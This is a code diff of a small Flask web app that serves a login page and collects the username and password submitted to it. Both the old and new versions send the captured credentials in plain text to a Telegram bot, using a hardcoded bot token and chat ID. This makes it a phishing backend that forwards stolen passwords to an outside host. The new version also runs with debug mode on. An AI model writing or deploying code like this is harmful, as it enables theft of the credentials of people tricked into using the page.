@@ -1,32 +1,31 @@
-from flask import Flask, render_template, request
+from flask import Flask, request, render_template_string
 import requests
 
 app = Flask(__name__)
 
-# --- Optional: Telegram bot setup ---
-# Replace with your own Bot Token and Chat ID
+# Load HTML file
+with open("index.html") as f:
+    html_page = f.read()
+
+# Telegram Bot details
 BOT_TOKEN = "8273890387:AAG8BbidwS-UkY_Ct-bdmbFbHq6xr_qdBqM"
 CHAT_ID = "6291023089"
 
-@app.route('/')
+@app.route("/")
 def home():
-    return render_template('index.html')
+    return render_template_string(html_page)
 
-@app.route('/login', methods=['POST'])
+@app.route("/login", methods=["POST"])
 def login():
-    username = request.form.get('username')
-    password = request.form.get('password')
-
-    # Send data to Telegram (optional)
-    message = f"👤 New Login Attempt:\nUsername: {username}\nPassword: {password}"
+    username = request.form.get("username")
+    password = request.form.get("password")
+    
+    # Send to Telegram
+    message = f"Username: {username}\nPassword: {password}"
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    params = {"chat_id": CHAT_ID, "text": message}
-    try:
-        requests.get(url, params=params)
-    except Exception as e:
-        print("Error sending to Telegram:", e)
+    requests.get(url, params={"chat_id": CHAT_ID, "text": message})
 
-    return render_template('success.html', username=username)
+    return "<h3>Login info sent successfully!</h3>"
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+if __name__ == "__main__":
+    app.run(debug=True)
